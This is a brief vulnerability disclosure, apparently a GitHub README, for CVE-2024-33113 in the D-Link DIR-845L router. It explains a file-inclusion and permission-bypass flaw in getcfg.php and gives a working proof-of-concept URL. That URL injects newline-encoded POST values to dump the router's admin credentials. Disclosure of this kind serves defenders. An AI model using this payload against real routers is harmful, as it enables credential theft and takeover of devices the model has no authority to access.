# CVE-2024-33113
D-LINK DIR-845L is vulnerable to information disclosure via the bsc_sms_inbox.php file.

We see `dophp("load", $file)`, a function of type `include()` .
The `$file` variable consists of `$GETCFG_SVC`, then `$GETCFG_SVC` comes from `$_POST["SERVICES"]`, there is no filter here either, so we can control the `$file` variable, and the is_power_user() permission check can be bypassed by the last trick. So we can include any other php scripts to get important information, for example DEVICE.ACCOUNT.xml.php, it returns the username and password to the router, then we can login to the router.

# PoC

```
http://IP:8080/getcfg.php?a=%0A_POST_SERVICES=DEVICE.ACCOUNT%0AAUTHORIZED_GROUP=1
```

![image](https://github.com/FaLLenSKiLL1/CVE-2024-33113/assets/43922662/680cc948-116d-4a89-8b89-8521c2ca3804)
